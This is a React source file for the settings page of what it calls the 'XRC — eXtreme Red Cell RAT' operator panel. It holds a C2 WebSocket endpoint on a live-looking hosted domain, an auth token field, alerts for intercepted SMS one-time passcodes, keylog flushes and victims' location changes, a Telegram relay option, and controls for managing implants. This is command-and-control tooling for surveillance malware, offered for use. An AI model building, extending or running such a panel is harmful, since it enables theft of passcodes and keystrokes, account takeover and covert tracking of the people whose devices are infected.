import { useState } from 'react';
import Toggle from '@/components/Toggle';

export default function Settings() {
  const [alertSms, setAlertSms] = useState(true);
  const [alertOtp, setAlertOtp] = useState(true);
  const [alertLocation, setAlertLocation] = useState(false);
  const [autoRefresh, setAutoRefresh] = useState(true);
  const [secret, setSecret] = useState('xrc-admin:********');
  const [endpoint, setEndpoint] = useState('wss://fasonrat-yvtl.onrender.com/socket.io');
  const [telegram, setTelegram] = useState('');

  return (
    <div className="grid gap-4 lg:grid-cols-2">
      <div className="space-y-4">
        <div className="rounded-xl border border-slate-800 bg-surface p-4 space-y-3">
          <div className="text-[10px] font-bold tracking-widest text-slate-500">C2 CONNECTION</div>
          <Field label="WebSocket endpoint" value={endpoint} onChange={setEndpoint} mono />
          <Field label="Panel auth token" value={secret} onChange={setSecret} mono />
          <button className="rounded-lg border border-slate-700 bg-slate-900 px-3 py-2 text-xs font-bold text-slate-300 hover:bg-slate-800">
            ⟳ Test connection
          </button>
        </div>

        <div className="rounded-xl border border-slate-800 bg-surface p-4 space-y-3">
          <div className="text-[10px] font-bold tracking-widest text-slate-500">ALERTS</div>
          <Row label="Push alert on new SMS OTP" checked={alertOtp} onChange={setAlertOtp} />
          <Row label="Push alert on keylog flush" checked={alertSms} onChange={setAlertSms} />
          <Row label="Push alert on location change" checked={alertLocation} onChange={setAlertLocation} />
          <Row label="Auto-refresh registry (15s)" checked={autoRefresh} onChange={setAutoRefresh} />
          <Field label="Telegram bot token (optional relay)" value={telegram} onChange={setTelegram} mono />
        </div>
      </div>

      <div className="space-y-4">
        <div className="rounded-xl border border-rose-500/30 bg-rose-500/5 p-4 space-y-3">
          <div className="text-[10px] font-bold tracking-widest text-rose-400">DANGER ZONE</div>
          <div className="flex flex-wrap gap-2">
            <button
              onClick={() => { if (window.confirm('Revoke ALL device registrations?')) { /* server-side wipe */ } }}
              className="rounded-lg border border-rose-500/50 bg-rose-500/10 px-3 py-2 text-xs font-bold text-rose-300 hover:bg-rose-500/20"
            >
              🗑 Wipe device registry
            </button>
            <button
              onClick={() => { if (window.confirm('Rotate panel token? Implants keep their session keys.')) { /* rotate */ } }}
              className="rounded-lg border border-rose-500/50 bg-rose-500/10 px-3 py-2 text-xs font-bold text-rose-300 hover:bg-rose-500/20"
            >
              🔑 Rotate panel token
            </button>
          </div>
        </div>

        <div className="rounded-xl border border-slate-800 bg-surface p-4 space-y-3">
          <div className="text-[10px] font-bold tracking-widest text-slate-500">ABOUT</div>
          <div className="text-xs text-slate-400 space-y-1">
            <div>XRC — eXtreme Red Cell RAT</div>
            <div className="font-mono text-slate-500">v1.0.0 · stack: React 18 · Vite 5 · Tailwind 3 · zustand 5 · Socket.IO 4</div>
            <div className="text-slate-600">Render free tier · cold start ~50s · deploy: push to main → auto build</div>
          </div>
        </div>
      </div>
    </div>
  );
}

function Field({ label, value, onChange, mono }: { label: string; value: string; onChange: (v: string) => void; mono?: boolean }) {
  return (
    <div>
      <div className="text-[11px] text-slate-500 mb-1">{label}</div>
      <input
        value={value}
        onChange={(e) => onChange(e.target.value)}
        className={`w-full rounded-lg bg-slate-900 border border-slate-800 px-3 py-2 text-xs text-slate-200 outline-none focus:border-cyan-500/50 ${mono ? 'font-mono' : ''}`}
      />
    </div>
  );
}

function Row({ label, checked, onChange }: { label: string; checked: boolean; onChange: (v: boolean) => void }) {
  return (
    <div className="flex items-center justify-between gap-3">
      <span className="text-xs text-slate-300">{label}</span>
      <Toggle checked={checked} onChange={onChange} />
    </div>
  );
}
